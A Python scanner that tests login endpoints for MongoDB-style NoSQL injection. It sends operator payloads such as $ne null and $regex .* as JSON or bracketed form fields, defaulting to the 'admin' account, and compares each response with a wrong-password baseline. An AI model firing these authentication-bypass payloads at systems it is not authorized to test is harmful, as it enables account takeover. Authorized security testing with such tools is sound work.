#!/usr/bin/env python3
"""
NoSQL Injection Scanner
--------------------------
Tests login/query parameters for NoSQL injection (primarily
MongoDB-style operator injection) using boolean-based differential
testing — the NoSQL equivalent of classic SQLi's "1=1 vs 1=2" trick.
Sends operator-injection payloads (like {"$ne": null} passed as JSON,
or the URL-encoded equivalent for form submissions) and compares
responses against a deliberately-wrong-credential baseline.

Intended for use ONLY against systems you own or are explicitly
authorized to test.

Usage:
    python nosql_scanner.py --url https://target.com/login --json --user-field username --pass-field password
    python nosql_scanner.py --url https://target.com/login --user-field username --pass-field password
"""

import argparse
import sys

import requests

# MongoDB operator injection payloads — these work when the app passes
# user input directly into a query filter without type/structure validation
NOSQL_PAYLOADS = [
    ({"$ne": None}, "$ne: null (not-equal bypass)"),
    ({"$ne": ""}, "$ne: '' (not-equal-to-empty-string bypass)"),
    ({"$gt": ""}, "$gt: '' (greater-than-empty bypass)"),
    ({"$regex": ".*"}, "$regex: .* (regex-match-all bypass)"),
    ({"$exists": True}, "$exists: true (field-exists bypass)"),
]


def build_json_payload(user_field, pass_field, user_value, pass_payload):
    return {user_field: user_value, pass_field: pass_payload}


def build_form_payload(user_field, pass_field, user_value, pass_payload):
    # Form-encoded NoSQL injection uses bracket notation: password[$ne]=null
    form_data = {user_field: user_value}
    if isinstance(pass_payload, dict):
        for op, val in pass_payload.items():
            form_data[f"{pass_field}[{op}]"] = str(val) if not isinstance(val, bool) else str(val).lower()
    else:
        form_data[pass_field] = pass_payload
    return form_data


def send_request(session, url, method, data, as_json, timeout):
    try:
        if as_json:
            resp = session.request(method, url, json=data, timeout=timeout)
        else:
            resp = session.request(method, url, data=data, timeout=timeout)
        return resp, None
    except requests.RequestException as e:
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(description="Test a login/query endpoint for NoSQL (MongoDB-style) injection.")
    parser.add_argument("--url", required=True, help="Target endpoint URL")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP method (default: POST)")
    parser.add_argument("--user-field", required=True, help="Username/identifier field name")
    parser.add_argument("--pass-field", required=True, help="Password field name (this is where injection operators go)")
    parser.add_argument("--user-value", default="admin", help="Username value to test with (default: 'admin' — try a known/likely valid account)")
    parser.add_argument("--json", action="store_true", help="Send as JSON body instead of form-encoded")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds")
    args = parser.parse_args()

    print(f"[*] Target: {args.url}")
    print(f"[*] Testing user field '{args.user_field}', injecting into '{args.pass_field}'")
    print("-" * 60)

    with requests.Session() as session:
        # Baseline: a definitely-wrong plain-string password — establishes what "failed login" looks like
        baseline_payload = (
            build_json_payload(args.user_field, args.pass_field, args.user_value, "definitely_wrong_password_xyz123")
            if args.json else
            build_form_payload(args.user_field, args.pass_field, args.user_value, "definitely_wrong_password_xyz123")
        )
        baseline_resp, err = send_request(session, args.url, args.method, baseline_payload, args.json, args.timeout)
        if err:
            print(f"[!] Baseline request failed: {err}", file=sys.stderr)
            sys.exit(1)

        print(f"[*] Baseline (wrong password): status={baseline_resp.status_code}, length={len(baseline_resp.content)}")
        print("-" * 60)

        any_confirmed = False
        for payload_dict, label in NOSQL_PAYLOADS:
            data = (
                build_json_payload(args.user_field, args.pass_field, args.user_value, payload_dict)
                if args.json else
                build_form_payload(args.user_field, args.pass_field, args.user_value, payload_dict)
            )
            resp, err = send_request(session, args.url, args.method, data, args.json, args.timeout)

            if err:
                print(f"[ERR ] {label:<45} {err}")
                continue

            status_differs = resp.status_code != baseline_resp.status_code
            len_diff = abs(len(resp.content) - len(baseline_resp.content))
            len_differs = len_diff > max(20, len(baseline_resp.content) * 0.1)

            # A 400/422 response usually means the app REJECTED the malformed input
            # (i.e. type validation caught it) -- that's the app being safe, not bypassed.
            # A bypass signal looks like success (2xx) or a status distinctly better than
            # the failed-baseline, not a generic "your request was malformed" response.
            looks_like_safe_rejection = resp.status_code in (400, 422) and baseline_resp.status_code not in (400, 422)

            if looks_like_safe_rejection:
                print(f"[ OK ] {label:<45} rejected with {resp.status_code} (input validation appears to reject non-string values)")
                continue

            if status_differs or len_differs:
                any_confirmed = True
                reason = []
                if status_differs:
                    reason.append(f"status {baseline_resp.status_code} -> {resp.status_code}")
                if len_differs:
                    reason.append(f"length diff {len_diff}")
                print(f"[!!! POSSIBLE BYPASS] {label}")
                print(f"      {', '.join(reason)}")
            else:
                print(f"[ -- ] {label:<45} matches baseline (no bypass)")

    print("-" * 60)
    if any_confirmed:
        print("[!] At least one payload produced a response different from the failed-login")
        print("    baseline — possible NoSQL injection auth bypass. Manually confirm by checking")
        print("    whether the response actually indicates a successful login (session cookie,")
        print("    redirect to a dashboard, etc.), not just a different error message.")
    else:
        print("[*] No payload differed from the baseline. Note this only tests the specific")
        print("    field/operator style used here — the app may still be vulnerable via a")
        print("    different field, a nested query structure, or a driver-specific quirk.")


if __name__ == "__main__":
    main()
